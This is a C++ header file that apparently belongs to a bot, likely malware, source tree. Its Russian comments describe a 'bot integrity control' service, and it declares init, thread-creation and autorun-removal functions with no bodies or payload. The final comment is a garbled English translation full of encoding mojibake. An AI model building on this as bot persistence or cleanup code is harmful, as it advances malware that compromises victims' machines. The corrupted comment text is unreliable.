/*
  Сервси контроля цельности бота.
*/
#pragma once

#include "..\common\threadsgroup.h"

namespace CoreControl
{
  /*
    Инициализация.
  */
  void init(void);

  /*
    Деинициализация.
  */
  void uninit(void);

  /*
    Создание потоков.

    IN OUT group - группа потокок, к которой будут принадлежать потоки сервиса.
    
    Return       - true - в случаи успеха,
                   false - в случаи ошибки.
  */
  bool _create(ThreadsGroup::GROUP *group);

  /*В В В В Clear all values вЂ‹вЂ‹from the system created by the bot to auto.
В В В В 
В В В В Return - true - if successful,
В В В В В В В В В В В В В false - if an error occurs.
В В */
  bool _removeAutorun(void);
};
